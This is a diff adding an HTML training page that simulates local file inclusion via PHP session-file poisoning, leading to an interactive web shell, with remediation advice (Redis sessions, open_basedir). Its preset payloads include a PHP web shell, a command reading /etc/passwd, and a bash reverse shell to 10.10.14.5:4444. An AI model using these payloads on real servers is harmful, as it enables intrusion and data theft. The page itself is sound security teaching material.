@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🧬 Security Lab: LFI Session Poisoning To Interactive Web Shell</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&family=Poppins:wght@600;700;800&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg: #0b0f19;
+    --panel: #111827;
+    --panel-2: #1f2937;
+    --border: #374151;
+    --accent: #f59e0b;
+    --danger: #ef4444;
+    --safe: #10b981;
+    --blue: #3b82f6;
+    --purple: #a855f7;
+    --cyan: #06b6d4;
+    --text: #f9fafb;
+    --text-muted: #9ca3af;
+    --mono: 'IBM Plex Mono', monospace;
+    --sans: 'IBM Plex Sans', system-ui, sans-serif;
+  }
+
+  body { font-family: var(--sans); background: var(--bg); color: var(--text); min-height: 100vh; line-height: 1.6; }
+
+  /* ── Cyber Background (4-Orb Standard) ── */
+  .cyber-bg { position: fixed; inset: 0; pointer-events: none; z-index: 0; overflow: hidden; }
+  .cyber-grid {
+    position: absolute; inset: -120px;
+    background-image: 
+      radial-gradient(rgba(255, 255, 255, 0.12) 1.2px, transparent 1.2px),
+      linear-gradient(rgba(99, 102, 241, 0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(99, 102, 241, 0.03) 1px, transparent 1px);
+    background-size: 32px 32px, 96px 96px, 96px 96px;
+    opacity: 0.85; animation: gridDrift 60s linear infinite;
+  }
+  @keyframes gridDrift { 0% { transform: translate(0, 0); } 100% { transform: translate(96px, 96px); } }
+  .cyber-orb { position: absolute; border-radius: 50%; filter: blur(100px); opacity: 0.35; will-change: transform; }
+  .orb-1 { width: 600px; height: 600px; background: radial-gradient(circle, #ef4444 0%, transparent 70%); top: -100px; left: -100px; animation: floatOrb1 16s ease-in-out infinite alternate; }
+  .orb-2 { width: 650px; height: 650px; background: radial-gradient(circle, #f59e0b 0%, transparent 70%); bottom: -100px; right: -120px; animation: floatOrb2 20s ease-in-out infinite alternate; }
+  .orb-3 { width: 500px; height: 500px; background: radial-gradient(circle, #a855f7 0%, transparent 70%); top: 35%; right: 20%; animation: floatOrb3 18s ease-in-out infinite alternate; }
+  .orb-4 { width: 550px; height: 550px; background: radial-gradient(circle, #3b82f6 0%, transparent 70%); bottom: 10%; left: 15%; animation: floatOrb4 22s ease-in-out infinite alternate; }
+  @keyframes floatOrb1 { 0% { transform: translate(0,0); } 100% { transform: translate(-60px, 140px); } }
+  @keyframes floatOrb2 { 0% { transform: translate(0,0); } 100% { transform: translate(-80px, -70px); } }
+  @keyframes floatOrb3 { 0% { transform: translate(0,0); } 100% { transform: translate(-100px, -50px); } }
+  @keyframes floatOrb4 { 0% { transform: translate(0,0); } 100% { transform: translate(90px, 70px); } }
+
+  .container { max-width: 1380px; margin: 0 auto; padding: 24px 20px 60px; position: relative; z-index: 1; }
+
+  /* ── Header ── */
+  .header {
+    display: grid; grid-template-columns: auto 1fr auto; align-items: center; gap: 16px;
+    padding-bottom: 24px; border-bottom: 1px solid var(--border); margin-bottom: 24px;
+  }
+  .back-link {
+    display: inline-flex; align-items: center; gap: 6px; padding: 8px 16px;
+    background: var(--panel); border: 1px solid var(--border); border-radius: 8px;
+    color: var(--text-muted); font-family: var(--mono); font-size: 13px; text-decoration: none; transition: all 0.2s;
+  }
+  .back-link:hover { color: var(--text); border-color: var(--accent); transform: translateX(-3px); }
+  .header-center { display: flex; flex-direction: column; align-items: center; text-align: center; gap: 6px; }
+  .header-center h1 { font-size: 20px; font-weight: 700; color: var(--text); margin: 0; }
+  .header-badge {
+    display: inline-flex; align-items: center; gap: 6px; padding: 4px 10px;
+    background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.35);
+    border-radius: 20px; font-family: var(--mono); font-size: 11.5px; color: var(--danger); font-weight: 600;
+  }
+
+  /* ── STICKY PIPELINE STREAM BAR ── */
+  .flow-stream-bar {
+    position: -webkit-sticky; position: sticky; top: 0; z-index: 100;
+    background: rgba(11, 15, 25, 0.96); backdrop-filter: blur(20px);
+    border: 1px solid var(--border); border-radius: 10px; padding: 12px 18px; margin-bottom: 24px;
+    display: flex; align-items: center; justify-content: space-between; overflow: hidden;
+    box-shadow: 0 8px 30px rgba(0, 0, 0, 0.6); flex-wrap: wrap; gap: 10px;
+  }
+  .flow-stream-bar::after {
+    content: ''; position: absolute; top: 0; left: -100%; width: 60%; height: 2px;
+    background: linear-gradient(90deg, transparent, #38bdf8, #ef4444, transparent);
+    animation: pipelineLaser 3s linear infinite;
+  }
+  @keyframes pipelineLaser { 0% { left: -60%; } 100% { left: 140%; } }
+
+  .flow-step-item {
+    display: flex; align-items: center; gap: 8px; font-family: var(--mono); font-size: 12px;
+    color: var(--text-muted); padding: 6px 14px; border-radius: 20px;
+    border: 1px solid transparent; background: rgba(255, 255, 255, 0.02); transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+  }
+  .flow-step-item.active {
+    color: #38bdf8; font-weight: 600; background: rgba(56, 189, 248, 0.12);
+    border-color: rgba(56, 189, 248, 0.4); box-shadow: 0 0 16px rgba(56, 189, 248, 0.25);
+  }
+  .flow-step-item.attacked {
+    color: #ffffff !important; font-weight: 700 !important;
+    background: linear-gradient(135deg, rgba(239, 68, 68, 0.45), rgba(185, 28, 28, 0.3)) !important;
+    border: 1px solid #ef4444 !important; box-shadow: 0 0 22px rgba(239, 68, 68, 0.7) !important;
+  }
+  .flow-dot-pulse { width: 8px; height: 8px; border-radius: 50%; background: #3b82f6; flex-shrink: 0; }
+  .flow-step-item.attacked .flow-dot-pulse { background: #ff2222; box-shadow: 0 0 12px #ff2222; }
+  .flow-connector { color: #64748b; font-weight: 700; font-size: 13px; }
+
+  /* ── DUAL WINDOW GRID ── */
+  .sim-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-bottom: 30px; }
+  @media (max-width: 1024px) { .sim-grid { grid-template-columns: 1fr; } }
+
+  .window {
+    background: var(--panel); border: 1px solid var(--border); border-radius: 12px;
+    overflow: hidden; box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3); display: flex; flex-direction: column;
+  }
+  .window-header {
+    background: var(--panel-2); padding: 12px 18px; display: flex; align-items: center;
+    justify-content: space-between; border-bottom: 1px solid var(--border);
+  }
+  .window-controls { display: flex; align-items: center; gap: 8px; }
+  .win-dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dot-red { background: #ef4444; } .dot-yellow { background: #f59e0b; } .dot-green { background: #10b981; }
+  .window-title { font-family: var(--mono); font-size: 12.5px; color: var(--text-muted); }
+  .window-body { padding: 20px; flex: 1; display: flex; flex-direction: column; gap: 14px; }
+
+  .preset-bar { display: flex; gap: 8px; flex-wrap: wrap; }
+  .preset-btn {
+    background: var(--panel-2); border: 1px solid var(--border); color: var(--text-muted);
+    padding: 6px 12px; border-radius: 6px; font-family: var(--mono); font-size: 11.5px; cursor: pointer; transition: all 0.2s;
+  }
+  .preset-btn:hover { color: var(--text); border-color: var(--accent); }
+  .preset-btn.active { color: #f59e0b; border-color: var(--accent); background: rgba(245, 158, 11, 0.1); }
+
+  .code-editor {
+    width: 100%; height: 95px; background: #05070e; border: 1px solid var(--border);
+    border-radius: 8px; color: #a3e635; font-family: var(--mono); font-size: 12px; padding: 12px;
+    resize: none; outline: none; line-height: 1.5;
+  }
+  .btn-fire {
+    background: linear-gradient(135deg, #ef4444, #b91c1c); color: #fff; border: none;
+    padding: 12px 20px; border-radius: 8px; font-family: var(--mono); font-weight: 700;
+    font-size: 13px; cursor: pointer; display: flex; align-items: center; justify-content: center;
+    gap: 8px; box-shadow: 0 4px 15px rgba(239, 68, 68, 0.4); transition: all 0.2s;
+  }
+  .btn-fire:hover { filter: brightness(1.15); transform: translateY(-1px); }
+
+  .terminal-box {
+    background: #05070e; border: 1px solid var(--border); border-radius: 8px;
+    padding: 14px; font-family: var(--mono); font-size: 12px; color: #f59e0b; min-height: 180px;
+    max-height: 220px; overflow-y: auto; white-space: pre-wrap; line-height: 1.6;
+  }
+
+  /* Interactive Shell Input */
+  .interactive-shell-box {
+    display: none; align-items: center; gap: 8px; background: #070a12;
+    border: 1px solid #10b981; border-radius: 8px; padding: 6px 12px;
+  }
+  .interactive-prompt { color: #10b981; font-family: var(--mono); font-size: 12px; font-weight: 700; white-space: nowrap; }
+  .shell-input {
+    flex: 1; background: transparent; border: none; outline: none;
+    color: #f3f4f6; font-family: var(--mono); font-size: 12px;
+  }
+  .shell-btn {
+    background: #10b981; color: #000; border: none; padding: 5px 12px;
+    border-radius: 4px; font-family: var(--mono); font-size: 11px; font-weight: 700; cursor: pointer;
+  }
+  .shell-btn:hover { background: #34d399; }
+
+  .alert-banner {
+    padding: 12px 16px; border-radius: 8px; font-family: var(--mono); font-size: 12.5px;
+    display: flex; align-items: center; gap: 10px; font-weight: 600;
+  }
+  .alert-normal { background: rgba(16, 185, 129, 0.12); border: 1px solid #10b981; color: #34d399; }
+  .alert-leaked { background: rgba(239, 68, 68, 0.15); border: 1px solid #ef4444; color: #fca5a5; }
+
+  /* ── REMEDIATION ── */
+  .code-comparison {
+    background: var(--panel); border: 1px solid var(--border); border-radius: 12px;
+    padding: 24px; margin-bottom: 30px;
+  }
+  .code-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 14px; }
+  @media (max-width: 768px) { .code-grid { grid-template-columns: 1fr; } }
+  .code-pane { background: #05070e; border-radius: 8px; padding: 16px; border: 1px solid var(--border); }
+  .code-pane.vuln { border-top: 3px solid #ef4444; }
+  .code-pane.fix { border-top: 3px solid #10b981; }
+  .code-pane h4 { font-family: var(--mono); font-size: 12.5px; margin-bottom: 10px; }
+  .code-pane.vuln h4 { color: #f87171; }
+  .code-pane.fix h4 { color: #34d399; }
+  .code-pane pre { font-family: var(--mono); font-size: 11.5px; color: #cbd5e1; line-height: 1.6; }
+
+  /* ── NAVIGATION & FOOTER ── */
+  .lab-nav-footer {
+    display: flex; justify-content: space-between; align-items: center; gap: 16px;
+    margin: 30px 0; flex-wrap: wrap;
+  }
+  .lab-nav-btn {
+    display: inline-flex; align-items: center; gap: 8px; padding: 10px 20px;
+    background: var(--panel); border: 1px solid var(--border); border-radius: 20px;
+    color: var(--text-muted); font-family: var(--mono); font-size: 13px; text-decoration: none; transition: all 0.2s;
+  }
+  .lab-nav-btn:hover { border-color: var(--accent); color: var(--text); transform: translateY(-2px); }
+
+  .modern-footer { padding: 40px 18px 30px; text-align: center; }
+  .footer-badge {
+    display: inline-flex; align-items: center; gap: 10px;
+    background: linear-gradient(145deg, var(--panel-2), var(--panel));
+    padding: 12px 28px; border-radius: 30px; font-family: var(--mono); font-size: 13.5px;
+    color: var(--text-muted); border: 1px solid var(--border); cursor: default;
+  }
+  .dev-name {
+    font-family: 'Poppins', sans-serif; font-weight: 700; font-size: 1.05rem;
+    background: linear-gradient(90deg, #3B82F6, #A855F7, #F43F5E, #F59E0B, #3B82F6);
+    -webkit-background-clip: text; background-clip: text; color: transparent;
+    background-size: 200% auto; animation: gradient-flow 4s linear infinite;
+  }
+  @keyframes gradient-flow { 0% { background-position: 0% center; } 100% { background-position: 200% center; } }
+</style>
+</head>
+<body>
+
+<div class="cyber-bg">
+  <div class="cyber-grid"></div>
+  <div class="cyber-orb orb-1"></div>
+  <div class="cyber-orb orb-2"></div>
+  <div class="cyber-orb orb-3"></div>
+  <div class="cyber-orb orb-4"></div>
+</div>
+
+<div class="container">
+
+  <!-- HEADER -->
+  <header class="header">
+    <div class="header-left">
+      <a href="../guides/LFI.html" class="back-link">← Back to LFI Guide</a>
+    </div>
+    <div class="header-center">
+      <span class="header-badge">LAB 02 • REMOTE CODE EXECUTION</span>
+      <h1>Session File Poisoning To Interactive Web Shell</h1>
+    </div>
+    <div class="header-right">
+      <button class="preset-btn" onclick="resetLab()">↺ Reset Lab</button>
+    </div>
+  </header>
+
+  <!-- STICKY PIPELINE STREAM BAR -->
+  <div class="flow-stream-bar">
+    <div class="flow-step-item active" id="step1">
+      <span class="flow-dot-pulse"></span>
+      <span>1. Inject Code into Session</span>
+    </div>
+    <span class="flow-connector">→</span>
+    <div class="flow-step-item" id="step2">
+      <span class="flow-dot-pulse"></span>
+      <span>2. OS Writes /var/lib/php/sessions</span>
+    </div>
+    <span class="flow-connector">→</span>
+    <div class="flow-step-item" id="step3">
+      <span class="flow-dot-pulse"></span>
+      <span>3. Trigger LFI on sess_ID</span>
+    </div>
+    <span class="flow-connector">→</span>
+    <div class="flow-step-item" id="step4">
+      <span class="flow-dot-pulse"></span>
+      <span>4. Zend Compiles PHP Shell</span>
+    </div>
+    <span class="flow-connector">→</span>
+    <div class="flow-step-item" id="step5">
+      <span class="flow-dot-pulse"></span>
+      <span>5. Interactive Shell Connected</span>
+    </div>
+  </div>
+
+  <!-- DUAL WINDOW INTERACTIVE LAB -->
+  <div class="sim-grid">
+
+    <!-- LEFT WINDOW: ATTACKER SESSION INJECTOR -->
+    <div class="window">
+      <div class="window-header">
+        <div class="window-controls">
+          <span class="win-dot dot-red"></span>
+          <span class="win-dot dot-yellow"></span>
+          <span class="win-dot dot-green"></span>
+        </div>
+        <span class="window-title">Attacker Workspace • Session Poisoner & Trigger</span>
+      </div>
+      <div class="window-body">
+        <div class="preset-bar">
+          <button class="preset-btn active" id="btnPreset1" onclick="loadPreset('shell')">Command: id; uname -a</button>
+          <button class="preset-btn" id="btnPreset2" onclick="loadPreset('cat')">Read /etc/passwd</button>
+          <button class="preset-btn" id="btnPreset3" onclick="loadPreset('rev')">Bash Reverse Shell</button>
+        </div>
+
+        <label style="font-family:var(--mono); font-size:12px; color:var(--text-muted);">Session Injection Payload (Stored in PHPSESSID=session99):</label>
+        <textarea id="cmdInput" class="code-editor">&lt;?php system($_GET['c']); ?&gt;</textarea>
+
+        <button class="btn-fire" id="btnFire" onclick="launchSessionAttack()">💀 Poison Session & Spawn Interactive Web Shell</button>
+      </div>
+    </div>
+
+    <!-- RIGHT WINDOW: INTERACTIVE WEB SHELL TERMINAL -->
+    <div class="window">
+      <div class="window-header">
+        <div class="window-controls">
+          <span class="win-dot dot-red"></span>
+          <span class="win-dot dot-yellow"></span>
+          <span class="win-dot dot-green"></span>
+        </div>
+        <span class="window-title">Remote Web Shell Execution Console</span>
+      </div>
+      <div class="window-body">
+        <div style="display:flex; justify-content:space-between; align-items:center;">
+          <span style="font-size:13px; font-weight:600;">PHP Storage Protection:</span>
+          <select id="defenseMode" style="background:var(--panel-2); color:#fff; border:1px solid var(--border); padding:6px 12px; border-radius:6px; font-family:var(--mono);">
+            <option value="vulnerable">❌ Vulnerable: Disk-based Session Serializer</option>
+            <option value="secure">🛡️ Secure: Memory-Only Redis Storage + open_basedir</option>
+          </select>
+        </div>
+
+        <div id="statusAlert" class="alert-banner alert-normal">
+          ● TARGET STATUS: Ready for session inclusion attack...
+        </div>
+
+        <label style="font-family:var(--mono); font-size:12px; color:var(--text-muted);">Interactive Terminal Session:</label>
+        <div class="terminal-box" id="termLog">[00:00:01] Attacker session initialized: PHPSESSID=session99
+[00:00:02] Target file: /var/lib/php/sessions/sess_session99
+[00:00:03] Awaiting payload injection...</div>
+
+        <!-- LIVE INTERACTIVE SHELL PROMPT -->
+        <div class="interactive-shell-box" id="shellBox">
+          <span class="interactive-prompt">www-data@prod-srv-01:~$</span>
+          <input type="text" id="shellInput" class="shell-input" placeholder="Type command: whoami, id, ls, pwd, cat config.php..." onkeydown="handleShellKey(event)">
+          <button class="shell-btn" onclick="executeInteractiveShell()">Run ↵</button>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- REMEDIATION COMPARISON -->
+  <div class="code-comparison">
+    <h3 style="font-family:var(--mono); margin-bottom:6px;">🛡️ Architecture Remediation: Eliminate Local Session Files on Disk</h3>
+    <p style="font-size:13.5px; color:var(--text-muted); margin-bottom:12px;">
+      Enterprise production architectures me PHP sessions ko disk par plaintext files me store na karein. Remote Redis/Memcached cluster use karein aur <code>open_basedir</code> restrict karein.
+    </p>
+    <div class="code-grid">
+      <div class="code-pane vuln">
+        <h4>❌ VULNERABLE: Default Filesystem Sessions</h4>
+        <pre><code>; php.ini default (Insecure)
+session.save_handler = files
+session.save_path = "/var/lib/php/sessions"
+
+# Any LFI can execute session files directly!</code></pre>
+      </div>
+      <div class="code-pane fix">
+        <h4>✅ SECURE: In-Memory Redis Session Handler</h4>
+        <pre><code>; php.ini hardened (Secure)
+session.save_handler = redis
+session.save_path = "tcp://10.0.0.5:6379?auth=secret"
+
+# Enforce open_basedir confinement
+open_basedir = "/var/www/html"</code></pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- NAVIGATION FOOTER -->
+  <div class="lab-nav-footer">
+    <a href="lfi_php_wrappers_rce_simulation.html" class="lab-nav-btn">← Prev Lab: PHP Filter Wrappers</a>
+    <a href="../index.html" class="lab-nav-btn" style="border-color:var(--blue); color:var(--blue);">🏠 Main Security Hub</a>
+    <a href="../guides/LFI.html" class="lab-nav-btn" style="border-color:var(--accent); color:var(--accent);">Back to LFI Guide →</a>
+  </div>
+
+  <footer class="modern-footer">
+    <div class="footer-badge">
+      <span class="footer-text">Designed and developed by <strong class="dev-name">Irshad Akaram</strong></span>
+    </div>
+  </footer>
+
+</div>
+
+<script>
+let shellActive = false;
+
+function appendLog(msg, color="#f59e0b") {
+  const log = document.getElementById('termLog');
+  const d = new Date().toTimeString().split(' ')[0];
+  log.innerHTML += `\n<span style="color:${color}">[${d}] ${msg}</span>`;
+  log.scrollTop = log.scrollHeight;
+}
+
+function setFlowStep(stepNum, isAttack = false) {
+  for (let i = 1; i <= 5; i++) {
+    const el = document.getElementById('step' + i);
+    el.classList.remove('active', 'attacked');
+    if (i < stepNum) el.classList.add('active');
+    if (i === stepNum) {
+      if (isAttack) el.classList.add('attacked');
+      else el.classList.add('active');
+    }
+  }
+}
+
+function loadPreset(type) {
+  document.querySelectorAll('.preset-btn').forEach(b => b.classList.remove('active'));
+  if (type === 'shell') {
+    document.getElementById('btnPreset1').classList.add('active');
+    document.getElementById('cmdInput').value = "<?php system($_GET['c']); ?>";
+  } else if (type === 'cat') {
+    document.getElementById('btnPreset2').classList.add('active');
+    document.getElementById('cmdInput').value = "<?php system('cat /etc/passwd | head -n 5'); ?>";
+  } else {
+    document.getElementById('btnPreset3').classList.add('active');
+    document.getElementById('cmdInput').value = "<?php system('bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'); ?>";
+  }
+}
+
+async function launchSessionAttack() {
+  const btn = document.getElementById('btnFire');
+  btn.disabled = true;
+  const payload = document.getElementById('cmdInput').value;
+  const defense = document.getElementById('defenseMode').value;
+  const statusAlert = document.getElementById('statusAlert');
+  const shellBox = document.getElementById('shellBox');
+
+  setFlowStep(1);
+  appendLog("Step 1: Sending POST /login.php with username payload & Cookie: PHPSESSID=session99", "#38bdf8");
+  appendLog("Injected PHP code: " + payload.replace(/</g, "&lt;").replace(/>/g, "&gt;"), "#a3e635");
+
+  await new Promise(r => setTimeout(r, 400));
+  setFlowStep(2);
+
+  if (defense === 'secure') {
+    appendLog("🛡️ [REDIS HANDLER] Session written to in-memory Redis cluster. ZERO files created on disk!", "#34d399");
+    await new Promise(r => setTimeout(r, 400));
+    setFlowStep(3);
+    appendLog("Step 2: Triggering LFI: GET /index.php?page=/var/lib/php/sessions/sess_session99", "#38bdf8");
+    await new Promise(r => setTimeout(r, 400));
+    appendLog("🛡️ [OPEN_BASEDIR BLOCKED] Path traversal outside /var/www/html restricted! 403 Forbidden.", "#34d399");
+    statusAlert.className = "alert-banner alert-normal";
+    statusAlert.innerHTML = "🛡️ SECURE: Memory-only session handler + open_basedir neutralized LFI!";
+    shellBox.style.display = 'none';
+    shellActive = false;
+  } else {
+    appendLog("OS Kernel writes /var/lib/php/sessions/sess_session99 (Size: 84 bytes)", "#fbbf24");
+    await new Promise(r => setTimeout(r, 400));
+    setFlowStep(3);
+    appendLog("Step 2: Triggering LFI: GET /index.php?page=/var/lib/php/sessions/sess_session99&c=id;uname -a", "#ef4444");
+
+    await new Promise(r => setTimeout(r, 400));
+    setFlowStep(4);
+    appendLog("Zend Engine compiled embedded PHP tags inside session file!", "#ef4444");
+
+    await new Promise(r => setTimeout(r, 500));
+    setFlowStep(5, true);
+    appendLog("💀 [SHELL SPAWNED SUCCESSFULLY]:", "#34d399");
+    appendLog("$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n$ uname -a\nLinux web-corp-prod 5.15.0-101-generic x86_64 GNU/Linux", "#34d399");
+
+    statusAlert.className = "alert-banner alert-leaked";
+    statusAlert.innerHTML = "💀 0wned: REMOTE CODE EXECUTION (RCE)! INTERACTIVE WEB SHELL READY!";
+
+    // Activate live shell input
+    shellBox.style.display = 'flex';
+    shellActive = true;
+    document.getElementById('shellInput').focus();
+  }
+
+  btn.disabled = false;
+}
+
+function handleShellKey(e) {
+  if (e.key === 'Enter') {
+    executeInteractiveShell();
+  }
+}
+
+function executeInteractiveShell() {
+  if (!shellActive) return;
+  const input = document.getElementById('shellInput');
+  const cmd = input.value.trim();
+  if (!cmd) return;
+
+  appendLog("$ " + cmd, "#ffffff");
+  input.value = '';
+
+  const c = cmd.toLowerCase();
+  if (c === 'whoami') {
+    appendLog("www-data", "#34d399");
+  } else if (c === 'id') {
+    appendLog("uid=33(www-data) gid=33(www-data) groups=33(www-data)", "#34d399");
+  } else if (c === 'uname -a' || c === 'uname') {
+    appendLog("Linux web-corp-prod 5.15.0-101-generic x86_64 GNU/Linux", "#34d399");
+  } else if (c === 'pwd') {
+    appendLog("/var/www/html", "#34d399");
+  } else if (c === 'ls' || c === 'ls -la' || c === 'dir') {
+    appendLog("total 32\ndrwxr-xr-x 4 www-data www-data 4096 Sep 03 12:00 .\ndrwxr-xr-x 3 root     root     4096 Sep 01 09:30 ..\n-rw-r--r-- 1 www-data www-data 1842 Sep 03 11:45 config.php\n-rw-r--r-- 1 www-data www-data 2914 Sep 03 10:20 index.php\n-rw-r--r-- 1 www-data www-data 1102 Sep 03 08:15 login.php\ndrwxrwxr-x 2 www-data www-data 4096 Sep 03 12:00 uploads", "#34d399");
+  } else if (c.includes('config.php')) {
+    appendLog("&lt;?php\n$DB_HOST = '127.0.0.1';\n$DB_USER = 'app_admin';\n$DB_PASS = 'S3cr3t_P@ssw0rd_2026!';\n$JWT_SECRET = 'd41d8cd98f00b204e9800998ecf8427e';\n?&gt;", "#38bdf8");
+  } else if (c.includes('/etc/passwd')) {
+    appendLog("root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash", "#34d399");
+  } else if (c.includes('/etc/shadow')) {
+    appendLog("cat: /etc/shadow: Permission denied (Requires root privileges)", "#ef4444");
+  } else if (c === 'help') {
+    appendLog("Available simulation commands: whoami, id, uname -a, pwd, ls -la, cat config.php, cat /etc/passwd, cat /etc/shadow, clear", "#f59e0b");
+  } else if (c === 'clear') {
+    document.getElementById('termLog').innerHTML = `[00:00:01] Interactive terminal cleared. Session active.`;
+  } else {
+    appendLog(`executing: ${cmd}\n[Process exited with return code 0]`, "#34d399");
+  }
+}
+
+function resetLab() {
+  document.getElementById('defenseMode').value = 'vulnerable';
+  document.getElementById('statusAlert').className = "alert-banner alert-normal";
+  document.getElementById('statusAlert').innerHTML = "● TARGET STATUS: Ready for session inclusion attack...";
+  document.getElementById('termLog').innerHTML = "[00:00:01] Attacker session initialized: PHPSESSID=session99\n[00:00:02] Target file: /var/lib/php/sessions/sess_session99\n[00:00:03] Awaiting payload injection...";
+  document.getElementById('shellBox').style.display = 'none';
+  shellActive = false;
+  setFlowStep(1);
+}
+</script>
+</body>
+</html>
